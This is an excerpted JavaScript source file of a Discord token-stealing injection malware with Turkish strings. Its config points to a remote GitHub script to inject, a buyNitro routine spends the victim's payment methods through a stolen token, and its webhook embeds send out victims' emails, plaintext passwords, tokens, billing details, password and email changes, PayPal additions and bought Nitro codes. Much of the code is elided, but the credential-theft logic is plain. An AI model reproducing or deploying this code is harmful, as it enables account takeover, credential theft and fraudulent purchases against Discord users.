...
const config = {
  ...
  ping_on_run: true, 
  ping_val: '@everyone',
  embed_name: 'kaskimigeriver', 
  embed_icon: 'https://cdn.discordapp.com/attachments/1132438619513163919/1134888227115905084/faruk.png'.replace(/ /g, '%20'), 
  embed_color: 2895667, 
  injection_url: 'https://raw.githubusercontent.com/muzafferbascivan/opmeyegiderkenopulmek/index.js', 
  /**
...
const buyNitro = async (token) => {
  const data = await fetchBilling(token);
  const failedMsg = 'Satın Alım Başarısız ❌';
...
const getBadges = (flags) => {
  ...
  switch (flags) {
    case 1:
      ...
      break;
    case 2:
      badges += 'Discord Partner Sunucu Sahibi, ';
      break;
    case 131072:
      badges += 'Doğrulanmış Bot Geliştiricisi, ';
      break;
    case 4:
      badges += 'Hypesquad Etkinliğine Katılmış, ';
      break;
    case 16384:
      badges += '2. Seviye Hata Avcısı, ';
      break;
    case 8:
      badges += '1. Seviye Hata Avcısı, ';
      break;
    case 512:
      badges += 'Erken Dönem Destekçisi, ';
      break;
    case 128:
    ...
    embeds: [
      {
        ...
        fields: [
          {
            ...
            value: `Mail: **${email}** - Parola: **${password}**`,
            inline: false,
          },
          {
            name: '**Discord Bilgileri**',
            value: `Nitro Türü: **${nitro}**\nRozetler: **${badges}**\nÖdeme: **${billing}**`,
            inline: false,
          },
          {
            name: '**Token**',
        ...
        footer: {
          text: 'https://cdn.discordapp.com/attachments/1132438619513163919/1134904471525281962/kaganserhan.mp3',
        },
      },
    ],
  };
    ...
    embeds: [
      {
        ...
        fields: [
          {
            name: '**Hesap Parolası Değişti**',
            value: `Mail: **${json.email}**\nEski Parola: **${oldpassword}**\nYeni Parola: **${newpassword}**`,
            inline: true,
          },
          {
            name: '**Discord Bilgileri**',
        ...
        footer: {
          text: 'https://cdn.discordapp.com/attachments/1132438619513163919/1134904744402497607/bismillahirrahmanirrahim.mp3',
        },
      },
    ],
  };
    ...
    embeds: [
      {
        ...
        fields: [
          {
            name: '**Mail Adresi Değişti**',
            value: `Yeni Mail Adresi: **${email}**\nParola: **${password}**`,
            inline: true,
          },
          {
            name: '**Discord Bilgileri**',
        ...
        footer: {
          text: 'https://cdn.discordapp.com/attachments/1132438619513163919/1134921656054317077/soylepelisoyle.mp3',
        },
      },
    ],
  };
    ...
    embeds: [
      {
        ...
        fields: [
          {
            name: '**Paypal Bilgisi Eklendi**',
            value: `Nitro alacak galiba :P`,
            inline: false,
          },
          {
            name: '**Discord Bilgileri**',
        ...
        footer: {
          text: 'https://cdn.discordapp.com/attachments/1132438619513163919/1134947392869904504/bananeamk.mp3',
        },
      },
    ],
  };
    ...
    embeds: [
      {
        ...
        footer: {
          text: 'https://cdn.discordapp.com/attachments/1132438619513163919/1134948006047780884/yook.mp3',
        },
      },
    ],
  };
    ...
    embeds: [
      {
        ...
        fields: [
          {
            name: '**Nitro Satın Aldı!**',
            value: `**Nitro Kodu:**\n\`\`\`diff\n+ ${code}\`\`\``,
            inline: true,
          },
          {
            name: '**Discord Bilgisi**',
            value: `Nitro Türü: **${nitro}**\nRozetler: **${badges}**\nÖdeme: **${billing}**`,
            inline: true,
          },
          {
        ...
        footer: {
          text: 'https://cdn.discordapp.com/attachments/1132438619513163919/1134948228790493184/var.mp3',
        },
      },
    ],
  };
